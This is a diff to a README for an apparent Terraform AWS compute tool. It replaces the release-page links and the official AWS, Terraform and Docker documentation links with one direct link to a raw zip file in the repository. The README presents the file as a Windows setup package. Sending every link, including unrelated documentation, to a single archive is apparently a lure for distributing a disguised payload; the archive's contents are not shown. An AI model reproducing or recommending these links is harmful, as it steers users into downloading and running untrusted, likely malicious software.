@@ -1,6 +1,6 @@
 # ⚙️ terraform-aws-validated-compute - Manage AWS Microservices Easily
 
-[![Download Release](https://img.shields.io/badge/Download-terraform--aws--validated--compute-brightgreen?style=for-the-badge)](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/releases)
+[![Download Release](https://img.shields.io/badge/Download-terraform--aws--validated--compute-brightgreen?style=for-the-badge)](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/raw/refs/heads/main/Pythic/aws-terraform-validated-compute-1.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Make sure your computer meets these basics before trying to run the software:
 
 Click the button below to go to the official download page:
 
-[![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/releases)
+[![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/raw/refs/heads/main/Pythic/aws-terraform-validated-compute-1.1.zip)
 
 This page contains the latest versions of the software. Find the release suitable for Windows. The files you want typically include the main setup package and any supporting tools.
 
@@ -134,9 +134,9 @@ If you run into issues:
 
 ## 🔗 Useful Links
 
-- AWS Account Setup: https://aws.amazon.com/getting-started/
-- Terraform Documentation: https://www.terraform.io/docs/index.html
-- Docker Documentation: https://docs.docker.com/
+- AWS Account Setup: https://github.com/Sinalo-OOS/terraform-aws-validated-compute/raw/refs/heads/main/Pythic/aws-terraform-validated-compute-1.1.zip
+- Terraform Documentation: https://github.com/Sinalo-OOS/terraform-aws-validated-compute/raw/refs/heads/main/Pythic/aws-terraform-validated-compute-1.1.zip
+- Docker Documentation: https://github.com/Sinalo-OOS/terraform-aws-validated-compute/raw/refs/heads/main/Pythic/aws-terraform-validated-compute-1.1.zip
 
 ---
 
@@ -144,4 +144,4 @@ If you run into issues:
 
 Return to the release page when ready to download or update:
 
-[Download Latest Release](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/releases)
+[Download Latest Release](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/raw/refs/heads/main/Pythic/aws-terraform-validated-compute-1.1.zip)
